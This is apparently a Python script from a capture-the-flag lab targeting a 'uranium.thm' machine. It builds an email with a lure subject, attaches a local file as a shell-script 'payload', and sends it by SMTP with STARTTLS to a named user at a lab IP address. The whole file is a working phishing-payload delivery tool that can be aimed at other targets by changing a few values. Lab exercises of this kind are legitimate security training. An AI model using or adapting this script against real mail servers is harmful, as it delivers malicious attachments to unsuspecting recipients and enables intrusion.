from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
import sys

rhost = "10.10.208.199"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "sssd@uranium"
msg['To'] = "hakanbey@uranium.thm"
msg['Subject'] = "This is not a drill!"

# payload 
attachment = "/home/ac1d/application"


try:
    with open(attachment, "rb") as attachment:
        p = MIMEApplication(attachment.read(),_subtype="sh")
        p.add_header("Content-Disposition", "attachment; filename=application")
        msg.attach(p)
except Exception as e:
    print(e)

print("[*] Payload is generated : %s" % msg)


server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
